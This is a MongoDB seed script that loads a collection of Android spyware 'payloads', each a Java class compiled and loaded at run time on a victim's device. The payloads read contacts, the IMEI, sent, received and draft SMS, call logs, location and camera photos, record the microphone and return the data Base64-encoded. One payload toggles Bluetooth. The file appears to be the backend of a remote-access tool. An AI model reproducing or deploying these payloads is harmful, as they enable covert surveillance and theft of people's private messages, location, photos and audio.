let dump = [{
    "_id": "5ec26c30b5020e3ff0592a5f",
    "vulnerabilities": [],
    "name": "Test",
    "description": "Payload to test if dynamic compiling and dynamic loading works",
    "content": "import android.util.Log;\nimport android.content.Context;\n\nclass RuntimeClass {\n  \tpublic RuntimeClass() {}\n  \n \tpublic String run(Context context) {\n    \tLog.d(\"TAG_HACK\", \"Hacked\");\n      \treturn \"Hacked!\";\n    }\n}",
    "resultType": "String",
    "__v": 0
}, {
    "_id": "5ec3d256a8504d2f00bd6b4d",
    "vulnerabilities": ["android.permission.READ_CONTACTS"],
    "name": "Read Contacts",
    "description": "Read all contacts",
    "content": "import android.content.Context;\nimport android.database.Cursor;\nimport android.net.Uri;\n\nclass RuntimeClass {\n    public RuntimeClass() {}\n\n    public String run(Context context) {\n        Cursor cursor = context.getContentResolver().query(ContactsContract.Data.CONTENT_URI, null, null, null, null);\n\n        String jsonEncodedContacts = \"[\";\n        if (cursor != null && cursor.moveToFirst() ) {\n            do {\n                jsonEncodedContacts += \"{\";\n                for(int idx=0; idx < cursor.getColumnCount(); idx++){\n                    jsonEncodedContacts += \" \\\"\" + cursor.getColumnName(idx) + \"\\\":\\\"\" + cursor.getString(idx) + \"\\\",\";\n                }\n                jsonEncodedContacts = jsonEncodedContacts.substring(0, jsonEncodedContacts.length() - 1);\n                jsonEncodedContacts += \"},\";\n            } while (cursor.moveToNext());\n            jsonEncodedContacts = jsonEncodedContacts.substring(0, jsonEncodedContacts.length() - 1);\n        }\n        jsonEncodedContacts += \"]\";\n        return  jsonEncodedContacts;\n    }\n}",
    "resultType": "JSON",
    "__v": 0
}, {
    "_id": "5ec3d40fc7f0f04d44470239",
    "vulnerabilities": ["android.permission.READ_PHONE_STATE"],
    "name": "IMEI",
    "description": "Read IMEI",
    "content": "import android.content.Context;\nimport android.telephony.TelephonyManager;\n\nclass RuntimeClass {\n    public RuntimeClass() {}\n\n    public String run(Context context) {\n        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);\n        return telephonyManager.getDeviceId();\n    }\n}\n",
    "resultType": "String",
    "__v": 0
}, {
    "_id": "5ec3e28b8e0bb29b14a23dfc",
    "vulnerabilities": ["android.permission.READ_SMS"],
    "name": "Read SMS sent",
    "description": "Read SMS sent",
    "content": "import android.content.Context;\nimport android.database.Cursor;\nimport android.net.Uri;\n\nclass RuntimeClass {\n    public RuntimeClass() {}\n\n    public String run(Context context) {\n        Cursor cursor = context.getContentResolver().query(Uri.parse(\"content://sms/sent\"), null, null, null, null);\n\n        String jsonEncodedSMS = \"[\";\n        if (cursor != null && cursor.moveToFirst() ) {\n            do {\n                jsonEncodedSMS += \"{\";\n                for(int idx=0; idx < cursor.getColumnCount(); idx++){\n                    jsonEncodedSMS += \" \\\"\" + cursor.getColumnName(idx) + \"\\\":\\\"\" + cursor.getString(idx) + \"\\\",\";\n                }\n                jsonEncodedSMS += \"},\";\n            } while (cursor.moveToNext());\n        }\n        jsonEncodedSMS += \"]\";\n        return jsonEncodedSMS;\n    }\n}",
    "resultType": "JSON",
    "__v": 0
}, {
    "_id": "5ec3e2c78e0bb29b14a23dfd",
    "vulnerabilities": ["android.permission.READ_SMS"],
    "name": "Read SMS received",
    "description": "Read SMS received",
    "content": "import android.content.Context;\nimport android.database.Cursor;\nimport android.net.Uri;\n\nclass RuntimeClass {\n  \tpublic RuntimeClass() {}\n  \n \tpublic String run(Context context) {\n        Cursor cursor = context.getContentResolver().query(Uri.parse(\"content://sms/inbox\"), null, null, null, null);\n\n        if (cursor.moveToFirst()) { \n            String msgData = \"\";\n            do {\n                for(int idx=0;idx<cursor.getColumnCount();idx++){\n                    msgData += \" \" + cursor.getColumnName(idx) + \":\" + cursor.getString(idx);\n                }\n            } while (cursor.moveToNext());\n\n            return msgData;\n        } else {\n            return \"No SMS recived\";\n        }\n    }\n}",
    "resultType": "JSON",
    "__v": 0
}, {
    "_id": "5ec3e2ca8e0bb29b14a23dfe",
    "vulnerabilities": ["android.permission.READ_SMS"],
    "name": "Read SMS draft",
    "description": "Read SMS draft",
    "content": "import android.content.Context;\nimport android.database.Cursor;\nimport android.net.Uri;\n\nclass RuntimeClass {\n  \tpublic RuntimeClass() {}\n  \n \tpublic String run(Context context) {\n        Cursor cursor = context.getContentResolver().query(Uri.parse(\"content://sms/draft\"), null, null, null, null);\n\n        if (cursor.moveToFirst()) { \n            String msgData = \"\";\n            do {\n                for(int idx=0;idx<cursor.getColumnCount();idx++){\n                    msgData += \" \" + cursor.getColumnName(idx) + \":\" + cursor.getString(idx);\n                }\n            } while (cursor.moveToNext());\n\n            return msgData;\n        } else {\n            return \"No SMS draft\";\n        }\n    }\n}",
    "resultType": "JSON",
    "__v": 0
}, {
    "_id": "5ec3edf60188357e9839ce25",
    "vulnerabilities": ["android.permission.READ_CALL_LOG"],
    "name": "Phone Calls",
    "description": "Phone Calls",
    "content": "import android.content.Context;\nimport android.database.Cursor;\nimport android.net.Uri;\n\nclass RuntimeClass {\n    public RuntimeClass() {}\n\n    public String run(Context context) {\n        Cursor cursor = context.getContentResolver().query(Uri.parse(\"content://call_log/calls\"), null, null, null, null);\n\n        String jsonEncodedContacts = \"[\";\n        if (cursor != null && cursor.moveToFirst() ) {\n            do {\n                jsonEncodedContacts += \"{\";\n                for(int idx=0; idx < cursor.getColumnCount(); idx++){\n                    jsonEncodedContacts += \" \\\"\" + cursor.getColumnName(idx) + \"\\\":\\\"\" + cursor.getString(idx) + \"\\\",\";\n                }\n                jsonEncodedContacts = jsonEncodedContacts.substring(0, jsonEncodedContacts.length() - 1);\n                jsonEncodedContacts += \"},\";\n            } while (cursor.moveToNext());\n            jsonEncodedContacts = jsonEncodedContacts.substring(0, jsonEncodedContacts.length() - 1);\n        }\n        jsonEncodedContacts += \"]\";\n        return  jsonEncodedContacts;\n    }\n}",
    "resultType": "JSON",
    "__v": 0
}, {
    "_id": "5ec3f3d859639880ccb635dd",
    "vulnerabilities": ["android.permission.ACCESS_FINE_LOCATION"],
    "name": "Last last known location by network",
    "description": "Last last known location by network",
    "content": "import android.content.Context;\nimport android.location.Location;\nimport android.location.LocationManager;\n\nclass RuntimeClass {\n  \tpublic RuntimeClass() {}\n  \n \tpublic String run(Context context) {\n        LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);\n        Location location = locationManager.getLastKnownLocation(\"network\");\n        return location.toString();\n    }\n}",
    "resultType": "string",
    "__v": 0
}, {
    "_id": "5ed390ab2524b20025e7b0ea",
    "vulnerabilities": ["android.permission.READ_EXTERNAL_STORAGE"],
    "name": "Pics from storage",
    "description": "Pics from storage",
    "content": "import android.content.Context;\nimport android.os.Environment;\nimport android.util.Base64;\nimport android.util.Log;\nimport java.io.ByteArrayOutputStream;\nimport java.io.File;\nimport java.util.Arrays;\nimport java.io.FileInputStream;\n\nimport android.graphics.Bitmap;\nimport android.graphics.BitmapFactory;\n\nclass RuntimeClass {\n  public RuntimeClass() {}\n\n  public String run(Context context) {\n        try {\n            File cameraDir = Environment.getExternalStorageDirectory();\n            File picsDir = new File(cameraDir, \"/DCIM/Camera\");\n            Log.d(\"Files\", picsDir.toString());\n            String[] pics = picsDir.list();\n            Log.d(\"Files\", Arrays.toString(pics));\n            if(pics != null && pics.length > 0) {\n                File firstPic = new File(picsDir.getAbsoluteFile(), pics[0]);\n              \tBitmap bitmap = BitmapFactory.decodeFile(firstPic.getAbsolutePath());\n              \n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                bitmap.compress(Bitmap.CompressFormat.JPEG, 50, baos);\n                byte[] buffer = baos.toByteArray();\n                String a = Base64.encodeToString(buffer, Base64.DEFAULT);\n              \tString aL = String.valueOf(a.length());\n              \tLog.d(\"TAG\", aL);\n              \treturn a;\n            }\n        } catch (Exception e) { }\n\n\n        return \"No pics\";\n    }\n}",
    "resultType": "image",
    "__v": 0
}, {
    "_id": "5ef87f0af611530025d0943c",
    "vulnerabilities": ["android.permission.BLUETOOTH", "android.permission.BLUETOOTH_ADMIN"],
    "name": "Bluetooth",
    "description": "This payload turn on or off device's Bluetooth",
    "content": "import android.bluetooth.BluetoothAdapter;\nimport android.content.Context;\n\nclass RuntimeClass {\n    public RuntimeClass() {}\n\n    public String run(Context context) {\n        BluetoothAdapter mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();\n        if (mBluetoothAdapter.isEnabled()) {\n            mBluetoothAdapter.disable();\n            return \"Disabled\";\n        } else {\n            mBluetoothAdapter.enable();\n            return \"Enabled\";\n        }\n    }\n}",
    "resultType": "String",
    "__v": 0
}, {
    "_id": "5efb76b8d5a14c01a8fa0bc4",
    "vulnerabilities": ["android.permission.RECORD_AUDIO"],
    "name": "Mic",
    "description": "mic",
    "content": "package com.android.a2faces;\n\nimport android.content.Context;\nimport android.media.MediaRecorder;\nimport android.util.Base64;\n\nimport java.io.BufferedInputStream;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\n\nclass RuntimeClass {\n    public RuntimeClass() {}\n\n    public MediaRecorder run(Context context) {\n        try {\n            File audioFile = new File(context.getExternalCacheDir().getAbsolutePath(), \"test.mp3\");\n\n            MediaRecorder recorder = new MediaRecorder();\n            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);\n            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);\n\n            recorder.setOutputFile(audioFile.getAbsolutePath());\n            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);\n\n            recorder.prepare();\n\n            recorder.start();\n            return recorder;\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n\n        return null;\n    }\n\n    public String stop(MediaRecorder recorder, Context context) {\n        try {\n            recorder.stop();\n            recorder.release();\n\n            File audioFile = new File(context.getExternalCacheDir().getAbsolutePath(), \"test.mp3\");\n            InputStream inputStream = new FileInputStream(audioFile.getAbsolutePath());\n            byte[] bytes = new byte[(int)audioFile.length()];\n            BufferedInputStream bufferedInputStream = new BufferedInputStream(inputStream);\n            bufferedInputStream.read(bytes, 0, bytes.length);\n            bufferedInputStream.close();\n\n            String fileEncoded = Base64.encodeToString(bytes, Base64.DEFAULT);\n            audioFile.delete();\n            return fileEncoded;\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return \"\";\n    }\n}",
    "resultType": "Sound",
    "__v": 0
}]

db.payloads.drop();
db.payloads.insertMany(dump);


